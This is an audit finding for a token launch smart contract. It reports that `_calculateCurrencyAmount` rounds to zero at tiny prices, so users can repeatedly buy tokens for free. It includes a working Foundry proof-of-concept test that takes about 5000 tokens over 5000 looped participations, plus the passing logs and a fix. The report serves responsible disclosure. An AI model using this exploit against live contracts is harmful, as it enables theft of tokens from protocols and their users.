# Users can acquire token amounts without payment

### Summary


When the protocol lists a `launch` with a `launchGroup` that finalizes at participation, users can participate multiple times as long as their total token purchase amount is below the launch group `maxTokenAmountPerUser`.
Currently, a user can repeatedly participate in a `launchGroup` and accumulate tokens without paying any currency to the protocol. 

### Root Cause

If specific conditions are met, `_calculateCurrencyAmount` rounds down to 0, meaning the contract does not charge the user for the purchased tokens.

### Internal Pre-conditions

* `minTokenAmountPerUser < 1 token` 
* `tokenPriceBps` is set to very small value. In the provided PoC, `1 BPS` (0.000001 USDC) is used, which is a possible token price. For example, at the time of writing, 1 PEPE token costs approximately  0.0000096 USD despite having a $4 billion market cap.

### External Pre-conditions

* The backend must generate valid participation signatures. We assume that the backend always approves requests for KYC-verified users when their parameters fall within valid ranges.

### Attack Path

1. The user requests valid signatures from the backend.
2. They participate multiple times in the `launchGroup`, each time requesting a token amount that causes `_calculateCurrencyAmount` to round down to 0.
3. The user accumulates tokens without spending any currency (except gas fees).
4. This can continue until they reach `maxTokenAmountPerUser`.

### Impact

Users can acquire token amounts for free.

### PoC

In the provided PoC:
* `tokenPriceBps = 1`
*  `minTokenAmountPerUser = 0.5e18`
* `maxTokenAmountPerUser = 5000e18`
The user repeatedly requests `tokenAmount = 1e18 - 1`, which results in `currenctAmount` rounding down to 0.
Paste the following test in `Launch.Participate.t.sol`:
```solidity
        function test_accTokensForFree() public {
        CurrencyConfig memory currencyConfig =
            CurrencyConfig({tokenPriceBps: 1, isEnabled: true});

        LaunchGroupSettings memory settings = LaunchGroupSettings({
            finalizesAtParticipation: true,
            startsAt: block.timestamp,
            endsAt: block.timestamp + 1 days,
            maxTokenAllocation: 10000 * 10 ** launch.tokenDecimals(),
            minTokenAmountPerUser: 0.5e18,
            maxTokenAmountPerUser: 5000 * 10 ** launch.tokenDecimals(),
            status: LaunchGroupStatus.ACTIVE
        });


        vm.startPrank(manager);
        launch.createLaunchGroup(testLaunchGroupId, address(currency), currencyConfig, settings);
        vm.stopPrank();
        
        console.log("Currency balance before : ", currency.balanceOf(user1));
        for (uint256 i; i < 5000; i++) {
            uint256 tokenAmount = 1e18;
            ParticipationRequest memory request = ParticipationRequest({
                chainId: block.chainid,
                launchId: testLaunchId,
                launchGroupId: testLaunchGroupId,
                launchParticipationId: bytes32(uint256(i)),
                userId: testUserId,
                userAddress: user1,
                tokenAmount: tokenAmount - 1,
                currency: address(currency),
                requestExpiresAt: block.timestamp + 1 hours
            });

            bytes memory signature = _signRequest(abi.encode(request));

            vm.startPrank(user1);
            // currency.approve(address(launch), 1e8);
            launch.participate(request, signature);
            vm.stopPrank();
        }
        console.log("User tokens by launchGroup: ", launch.getUserTokensByLaunchGroup(testLaunchGroupId, testUserId));
        console.log("Currency balance after  : ", currency.balanceOf(user1));
    }
```

Logs: 
```solidity
[PASS] test_accTokensForFree() (gas: 616432897)
Logs:
  Currency balance before :  2000000000000000000000
  User tokens by launchGroup:  4999999999999999995000
  Currency balance after  :  2000000000000000000000
```

As seen from the test results, the user accumulated ~5000 tokens for free without spending any currency.


### Mitigation

It is recommended to ensure that `currencyAmount` is always greater than 0.
